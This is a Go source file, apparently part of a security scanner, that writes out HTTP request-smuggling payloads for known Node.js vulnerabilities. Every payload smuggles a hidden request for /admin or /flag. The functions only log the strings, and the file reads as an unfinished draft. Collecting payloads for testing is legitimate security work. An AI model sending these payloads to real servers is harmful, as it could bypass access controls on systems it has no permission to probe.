package nodeHRS

import (
	"fmt"
	"log"
	"strings"
)

/*
https://hackerone.com/reports/1524555
Node.js: HTTP Request Smuggling due to ignoring chunk extensions
https://vulners.com/hackerone/H1:1238099
只有换行符号，没有回车符号
*/
func CVE202232213(u string) {
	var a = []string{
		`GET / HTTP/1.1
Host: %s
Transfer-Encoding: chunked

2 \nxx
4c
0

GET /admin HTTP/1.1
Host: %s
Transfer-Encoding: chunked

0


`,
	}
	s := strings.Join(a, "")
	log.Println(s)
}

// https://hackerone.com/reports/1501679
func Check2(u string) {
	s := "GET / HTTP/1.1\r\n" +
		"Transfer-Encoding: chunked\r\n" +
		" , identity\r\n" +
		"\r\n" +
		"1\r\n" +
		"a\r\n" +
		"0\r\n" +
		"\r\n"
	s = "POST / HTTP/1.1\nHost: 127.0.0.1\nTransfer-Encoding: chunked\n , chunked-false\n\n1\nA\n0\n\nGET /flag HTTP/1.1\nHost: 127.0.0.1\nfoo: x\n\n"
	log.Println(s)
}

// https://hackerone.com/reports/1524555
func Chk(u string) {
	s := fmt.Sprintf(`GET / HTTP/1.1
Host: %s
Transfer-Encoding: chunkedchunked

26
GET / HTTP/1.1
Content-Length: 30


0


GET /admin HTTP/1.1

`, "host")

	log.Println(s)
}

// HTTP Request Smuggling Due To Improper Delimiting of Header Fields
// https://hackerone.com/reports/1524692
func Check3(u string) {
	s := `GET / HTTP/1.1
Host: localhost
Dummy: x[\n]Content-Length: 23

GET / HTTP/1.1
Dummy: GET /admin HTTP/1.1
Host: localhost

`
	s = "GET / HTTP/1.1\r\n" +
		"Host: localhost\r\n" +
		"Dummy: x\nContent-Length: 23\r\n" +
		"\r\n" +
		"GET / HTTP/1.1\r\n" +
		"Dummy: GET /admin HTTP/1.1\r\n" +
		"Host: localhost\r\n" +
		"\r\n" +
		"\r\n"

	log.Println(s)
}
